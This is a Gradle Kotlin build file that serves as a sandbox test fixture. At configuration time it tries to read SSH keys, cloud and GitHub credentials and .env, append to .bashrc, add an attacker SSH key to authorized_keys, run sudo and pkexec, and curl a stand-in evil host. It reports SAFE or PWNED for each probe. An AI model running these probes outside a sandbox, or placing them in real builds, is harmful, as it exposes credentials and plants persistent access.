// Hostile Gradle build — exercises every attack in fixtures/ATTACKS.md.
//
// Gradle's Kotlin DSL evaluates this file at configuration time, before any
// task runs. So a `gradle help` or `gradle build` triggers every probe.
// Each prints one of:
//   SAFE: <id> <reason>
//   PWNED: <id> <evidence>
//
// CI greps for PWNED: and fails on any occurrence.

plugins {
    java
}

group = "com.sbetest"
version = "0.1.0"

repositories {
    mavenCentral()
}

java {
    sourceCompatibility = JavaVersion.VERSION_17
    targetCompatibility = JavaVersion.VERSION_17
}

import java.io.File
import java.nio.file.Files
import java.nio.file.Paths

val HOME: String = System.getenv("HOME") ?: "/tmp"

fun report(id: String, ok: Boolean, msg: String) {
    val tag = if (ok) "SAFE" else "PWNED"
    System.err.println("$tag: $id $msg")
}

fun tryRead(id: String, path: String) {
    try {
        val buf = Files.readAllBytes(Paths.get(path))
        if (buf.isEmpty()) report(id, true, "readable but empty: $path")
        else report(id, false, "read ${buf.size} bytes from $path")
    } catch (e: Exception) {
        report(id, true, "blocked: ${e.message}")
    }
}

fun tryAppend(id: String, path: String, payload: String) {
    try {
        val f = File(path)
        f.parentFile?.mkdirs()
        f.appendText(payload)
        report(id, false, "wrote to $path")
    } catch (e: Exception) {
        report(id, true, "blocked: ${e.message}")
    }
}

fun tryExec(id: String, program: String, args: List<String>) {
    try {
        val p = ProcessBuilder(listOf(program) + args)
            .redirectErrorStream(true)
            .start()
        val finished = p.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
        if (!finished) {
            p.destroyForcibly()
            report(id, true, "exec $program timed out (likely sandboxed)")
            return
        }
        if (p.exitValue() == 0) report(id, false, "exec $program succeeded")
        else report(id, true, "exec $program returned ${p.exitValue()} (likely sandboxed)")
    } catch (e: Exception) {
        report(id, true, "blocked: ${e.message}")
    }
}

fun tryCurl(id: String, url: String) {
    try {
        val p = ProcessBuilder(
            "/usr/bin/curl", "-sSL", "--max-time", "5",
            "-o", "/dev/null", "-w", "%{http_code}", url
        ).start()
        val out = p.inputStream.bufferedReader().readText().trim()
        p.waitFor()
        if (p.exitValue() == 0 && out.startsWith("2"))
            report(id, false, "HTTP $out from $url")
        else
            report(id, true, "blocked: curl exit=${p.exitValue()} http=$out")
    } catch (e: Exception) {
        report(id, true, "blocked: ${e.message}")
    }
}

tryRead("ssh-read",      "$HOME/.ssh/id_ed25519")
tryRead("aws-read",      "$HOME/.aws/credentials")
tryRead("gcloud-read",   "$HOME/.config/gcloud/credentials.db")
tryRead("gh-token-read", "$HOME/.config/gh/hosts.yml")
tryRead("env-read",      "./.env")
tryAppend("bashrc-write",          "$HOME/.bashrc",              "\n# pwned\n")
tryAppend("authorized-keys-write", "$HOME/.ssh/authorized_keys", "\nssh-rsa AAAAATTACKER attacker@evil\n")
tryExec("sudo-exec",   "/usr/bin/sudo",   listOf("-l"))
tryExec("pkexec-exec", "/usr/bin/pkexec", listOf("--version"))
tryCurl("curl-evil",   "https://evil.example.invalid/")
